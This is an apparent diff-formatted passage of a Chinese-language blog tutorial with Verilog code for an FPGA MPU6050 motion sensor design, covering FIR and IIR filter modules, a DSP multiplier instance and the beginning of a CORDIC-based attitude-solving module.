+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+        fir_filter_step_cnt <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> fir_filter_en <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+        fir_filter_step_cnt <span class="token operator">&lt;=</span> fir_filter_step_cnt <span class="token operator">+</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        fir_filter_step_cnt <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+
+end
+
+
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">case</span><span class="token punctuation">(</span>fir_filter_step_cnt<span class="token punctuation">)</span>
+    'd0<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_0 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save0<span class="token punctuation">;</span> end
+    'd1<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_1 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save1<span class="token punctuation">;</span> end
+    'd2<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_2 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save2<span class="token punctuation">;</span> end
+    'd3<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_3 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save3<span class="token punctuation">;</span> end
+    'd4<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_4 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save4<span class="token punctuation">;</span> end
+    'd5<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_5 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save5<span class="token punctuation">;</span> end
+    'd6<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_6 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save6<span class="token punctuation">;</span> end
+    'd7<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_7 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save7<span class="token punctuation">;</span> end
+    'd8<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_8 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save8<span class="token punctuation">;</span> end
+    <span class="token keyword">default</span><span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_0<span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> data_save0<span class="token punctuation">;</span>end
+    endcase
+end
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> 
+        add_out <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> fir_filter_en <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> fir_filter_step_cnt <span class="token operator">&gt;</span> 'd0<span class="token punctuation">)</span>
+            add_out <span class="token operator">&lt;=</span> mul_ab <span class="token operator">+</span> add_out<span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            add_out <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        add_out <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+end
+
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+        filter_data_o <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> fir_filter_step_cnt <span class="token operator">==</span> 'd9<span class="token punctuation">)</span>
+        filter_data_o <span class="token operator">&lt;=</span> add_out <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">8</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        filter_data_o <span class="token operator">&lt;=</span> filter_data_o<span class="token punctuation">;</span>
+end
+
+<span class="token comment">//由于数据只有16位有方向，而DSP为18*18，所以需要补充高位，防止方向改变</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   mul_c<span class="token punctuation">;</span>
+assign mul_ab<span class="token operator">=</span>mul_c<span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+dsp_v1 <span class="token function">dsp_v1_1</span><span class="token punctuation">(</span>
+    <span class="token punctuation">.</span><span class="token function">clk</span>	<span class="token punctuation">(</span>sys_clk_i<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">rstn</span>	<span class="token punctuation">(</span>sys_rst_n_i<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">x0</span>		<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>mul_a<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_a<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_a<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">y0</span>		<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>mul_b<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_b<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">r0</span>		<span class="token punctuation">(</span>mul_c<span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+endmodule
+</code></pre> 
+<p><font size="4.5" color="Orange">      在调用DSP的时候，需要注意不要寄存打拍数据，不然还要做数据同步，有点麻烦。<br> <img src="https://images2.imgbox.com/5c/03/5YFMW7AM_o.png" alt="在这里插入图片描述"><br>       由于数据只有16位有方向，而DSP为18*18，所以需要补充高位，防止方向改变</font></p> 
+<pre><code class="prism language-c">reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    mul_a<span class="token punctuation">,</span>mul_b<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   mul_ab<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   mul_c<span class="token punctuation">;</span>
+assign mul_ab<span class="token operator">=</span>mul_c<span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+dsp_v1 <span class="token function">dsp_v1_1</span><span class="token punctuation">(</span>
+    <span class="token punctuation">.</span><span class="token function">clk</span>	<span class="token punctuation">(</span>sys_clk_i<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">rstn</span>	<span class="token punctuation">(</span>sys_rst_n_i<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">x0</span>		<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>mul_a<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_a<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_a<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">y0</span>		<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>mul_b<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_b<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">r0</span>		<span class="token punctuation">(</span>mul_c<span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+</code></pre> 
+<p><font size="4.5" color="red">iir滤波：角速度<br>       角速度通常包含较高频率的变化，因为陀螺仪可以感知快速的旋转。IIR滤波器在处理高频信号时可能更为适用，因为它可以提供较好的动态响应。</font></p> 
+<pre><code class="prism language-c">`timescale <span class="token number">1</span>ns <span class="token operator">/</span> <span class="token number">1</span>ps
+<span class="token comment">//**************************************** Message ***********************************//</span>
+<span class="token comment">//技术交流：bumianzhe@126.com</span>
+<span class="token comment">//关注CSDN博主：“千歌叹尽执夏”</span>
+<span class="token comment">//Author: FPGA之旅 &amp; 千歌叹尽执夏 </span>
+<span class="token comment">//All rights reserved	                               </span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">// Target Devices: 		H7P20N0L176-M2H1</span>
+<span class="token comment">// Tool Versions:       Fuxi 2023.1</span>
+<span class="token comment">// File name:           MPU6050_iir_filter</span>
+<span class="token comment">// Last modified Date:  2023年12月2日23:06:00</span>
+<span class="token comment">// Last Version:        V1.1</span>
+<span class="token comment">// Descriptions:        iir滤波器</span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">//****************************************************************************************//</span>
+
+module <span class="token function">MPU6050_iir_filter</span><span class="token punctuation">(</span>
+    input                   sys_clk_i                   <span class="token punctuation">,</span>   <span class="token comment">//系统时钟</span>
+    input                   sys_rst_n_i                 <span class="token punctuation">,</span>   <span class="token comment">//系统复位</span>
+
+    input                   iir_filter_req_i            <span class="token punctuation">,</span>   <span class="token comment">//fir滤波请求</span>
+    input                   iir_filter_ack_o            <span class="token punctuation">,</span>   <span class="token comment">//fir滤波响应</span>
+
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      data_i                      <span class="token punctuation">,</span>   <span class="token comment">//输入待滤波数据</span>
+    output reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> filter_data_o                   <span class="token comment">//滤波后的数据</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+reg iir_filter_en<span class="token punctuation">;</span>
+reg<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> iir_filter_step_cnt<span class="token punctuation">;</span>
+<span class="token comment">//滤波器系数  A对应输出   B对应输入   系数扩大了255</span>
+localparam COE_A0   <span class="token operator">=</span>   $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+localparam COE_A1   <span class="token operator">=</span>   $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">191</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//取反 ，为了让后面的减法 变成 加法</span>
+localparam COE_A2   <span class="token operator">=</span>   $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//取反</span>
+
+localparam COE_B0   <span class="token operator">=</span>   $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+localparam COE_B1   <span class="token operator">=</span>   $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+localparam COE_B2   <span class="token operator">=</span>   $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    input_data_d0<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    input_data_d1<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    input_data_d2<span class="token punctuation">;</span>
+
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    output_data_d0<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    output_data_d1<span class="token punctuation">;</span>
+
+
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    mul_a<span class="token punctuation">,</span>mul_b<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   mul_ab<span class="token punctuation">;</span>
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    add_out<span class="token punctuation">;</span>
+
+assign iir_filter_ack_o <span class="token operator">=</span> <span class="token punctuation">(</span> iir_filter_step_cnt <span class="token operator">==</span> <span class="token char">'d5) ? 1'</span>b1 <span class="token operator">:</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+        iir_filter_en <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_ack_o <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+        iir_filter_en <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_req_i <span class="token operator">==</span> <span class="token number">1</span><span class="token char">'b1 &amp;&amp; iir_filter_en == 1'</span>b0<span class="token punctuation">)</span>
+        iir_filter_en <span class="token operator">&lt;=</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        iir_filter_en <span class="token operator">&lt;=</span> iir_filter_en<span class="token punctuation">;</span>
+end
+
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+        iir_filter_step_cnt <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_en <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+        iir_filter_step_cnt <span class="token operator">&lt;=</span> iir_filter_step_cnt <span class="token operator">+</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        iir_filter_step_cnt <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span> 
+
+end
+
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        input_data_d0 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        input_data_d1 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        input_data_d2 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_ack_o <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span> begin
+        input_data_d0 <span class="token operator">&lt;=</span> input_data_d0<span class="token punctuation">;</span>
+        input_data_d1 <span class="token operator">&lt;=</span> input_data_d0<span class="token punctuation">;</span>
+        input_data_d2 <span class="token operator">&lt;=</span> input_data_d1<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_req_i <span class="token operator">==</span> <span class="token number">1</span><span class="token char">'b1 &amp;&amp; iir_filter_en == 1'</span>b0<span class="token punctuation">)</span> begin
+        input_data_d0 <span class="token operator">&lt;=</span> data_i<span class="token punctuation">;</span>
+        input_data_d1 <span class="token operator">&lt;=</span> input_data_d1<span class="token punctuation">;</span>
+        input_data_d2 <span class="token operator">&lt;=</span> input_data_d2<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> begin
+        input_data_d0 <span class="token operator">&lt;=</span> input_data_d0<span class="token punctuation">;</span>
+        input_data_d1 <span class="token operator">&lt;=</span> input_data_d1<span class="token punctuation">;</span>
+        input_data_d2 <span class="token operator">&lt;=</span> input_data_d2<span class="token punctuation">;</span>
+    end
+end
+
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i <span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        output_data_d0 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        output_data_d1 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_step_cnt <span class="token operator">==</span> 'd5<span class="token punctuation">)</span> begin
+        output_data_d0 <span class="token operator">&lt;=</span> add_out <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">8</span><span class="token punctuation">;</span>
+        output_data_d1 <span class="token operator">&lt;=</span> output_data_d0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> begin
+        output_data_d0 <span class="token operator">&lt;=</span> output_data_d0<span class="token punctuation">;</span>
+        output_data_d1 <span class="token operator">&lt;=</span> output_data_d1<span class="token punctuation">;</span>
+    end
+
+end
+
+
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i <span class="token punctuation">)</span> begin
+    <span class="token keyword">case</span><span class="token punctuation">(</span>iir_filter_step_cnt<span class="token punctuation">)</span>
+    'd0<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_B2 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> input_data_d2<span class="token punctuation">;</span> end
+    'd1<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_B1 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> input_data_d1<span class="token punctuation">;</span> end
+    'd2<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_B0 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> input_data_d0<span class="token punctuation">;</span> end
+    'd3<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_A1 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> output_data_d0<span class="token punctuation">;</span> end
+    'd4<span class="token operator">:</span> begin mul_a <span class="token operator">&lt;=</span> COE_A2 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> output_data_d1<span class="token punctuation">;</span> end
+    <span class="token keyword">default</span><span class="token operator">:</span>  begin mul_a <span class="token operator">&lt;=</span> COE_A0 <span class="token punctuation">;</span> mul_b <span class="token operator">&lt;=</span> input_data_d2<span class="token punctuation">;</span> end
+    endcase
+end
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> 
+        add_out <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_en <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_step_cnt <span class="token operator">&gt;</span> 'd0<span class="token punctuation">)</span>
+            add_out <span class="token operator">&lt;=</span> mul_ab <span class="token operator">+</span> add_out<span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            add_out <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        add_out <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+end
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+        filter_data_o <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> iir_filter_step_cnt <span class="token operator">==</span> 'd5<span class="token punctuation">)</span>
+        filter_data_o <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>add_out <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//+ $signed(3);</span>
+    <span class="token keyword">else</span>
+        filter_data_o <span class="token operator">&lt;=</span> filter_data_o<span class="token punctuation">;</span>
+end
+
+<span class="token comment">//由于数据只有16位有方向，而DSP为18*18，所以需要补充高位，防止方向改变</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   mul_c<span class="token punctuation">;</span>
+assign mul_ab<span class="token operator">=</span>mul_c<span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+dsp_v1 <span class="token function">dsp_v1_1</span><span class="token punctuation">(</span>
+    <span class="token punctuation">.</span><span class="token function">clk</span>	<span class="token punctuation">(</span>sys_clk_i<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">rstn</span>	<span class="token punctuation">(</span>sys_rst_n_i<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">x0</span>		<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>mul_a<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_a<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_a<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">y0</span>		<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>mul_b<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_b<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mul_b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">r0</span>		<span class="token punctuation">(</span>mul_c<span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+endmodule
+</code></pre> 
+<h3><a id="4_794"></a>4、姿态解算</h3> 
+<p>      调用2个Cordic算法模块，对滤波后的数据进行解算，并输出计算后的数据。第一个Cordic算法模块先计算出roll和sqrt(acc_y<em>acc_y + acc_z * acc_z)的值，然后第二个模块通过acc_x和sqrt(acc_y</em>acc_y + acc_z * acc_z)的值计算出 pitch的角度。最后对融合后的数据进行一个打拍滤波。</p> 
+<pre><code class="prism language-c">`timescale <span class="token number">1</span>ns <span class="token operator">/</span> <span class="token number">1</span>ps
+<span class="token comment">//**************************************** Message ***********************************//</span>
+<span class="token comment">//技术交流：bumianzhe@126.com</span>
+<span class="token comment">//关注CSDN博主：“千歌叹尽执夏”</span>
+<span class="token comment">//Author: FPGA之旅 &amp; 千歌叹尽执夏 </span>
+<span class="token comment">//All rights reserved	                               </span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">// Target Devices: 		H7P20N0L176-M2H1</span>
+<span class="token comment">// Tool Versions:       Fuxi 2023.1</span>
+<span class="token comment">// File name:           MPU6050_imu</span>
+<span class="token comment">// Last modified Date:  2023年8月26日12:00:00</span>
+<span class="token comment">// Last Version:        V1.1</span>
+<span class="token comment">// Descriptions:        MPU6050姿态解算</span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">//****************************************************************************************//</span>
+
+module <span class="token function">MPU6050_imu</span><span class="token punctuation">(</span>
+    input                   sys_clk_i                   <span class="token punctuation">,</span>   <span class="token comment">//系统时钟</span>
+    input                   sys_rst_n_i                 <span class="token punctuation">,</span>   <span class="token comment">//系统复位</span>
+
+    input                   mpu6050_imu_req_i           <span class="token punctuation">,</span>
+    output                  mpu6050_imu_ack_o           <span class="token punctuation">,</span>
+
+    <span class="token comment">//输入数据</span>
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      GYROX_i                     <span class="token punctuation">,</span>
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      GYROY_i                     <span class="token punctuation">,</span>
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      GYROZ_i                     <span class="token punctuation">,</span>
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      ACCELX_i                    <span class="token punctuation">,</span>
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      ACCELY_i                    <span class="token punctuation">,</span>
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      ACCELZ_i                    <span class="token punctuation">,</span>
+
+
+    output <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>     mpu6050_angle_roll_o        <span class="token punctuation">,</span>   <span class="token comment">//三轴角度输出</span>
+    output <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>     mpu6050_angle_pitch_o       <span class="token punctuation">,</span>   <span class="token comment">//三轴角度输出</span>
+    output <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>     mpu6050_angle_yaw_o             <span class="token comment">//三轴角度输出</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+localparam  S_IDLE      <span class="token operator">=</span>   'd0<span class="token punctuation">;</span>
+localparam  S_ROLL      <span class="token operator">=</span>   'd1<span class="token punctuation">;</span>
+localparam  S_PITCH     <span class="token operator">=</span>   'd2<span class="token punctuation">;</span>
+localparam  S_GYRO_RP   <span class="token operator">=</span>   'd3<span class="token punctuation">;</span>
+localparam  S_IMU       <span class="token operator">=</span>   'd4<span class="token punctuation">;</span>
+localparam  S_MEAN      <span class="token operator">=</span>   'd5<span class="token punctuation">;</span>
+localparam  S_ACK       <span class="token operator">=</span>   'd6<span class="token punctuation">;</span>
+
+reg<span class="token punctuation">[</span><span class="token number">5</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    state <span class="token punctuation">,</span> next_state<span class="token punctuation">;</span>
+
+
+
+wire roll_req<span class="token punctuation">;</span>
+wire roll_ack<span class="token punctuation">;</span>
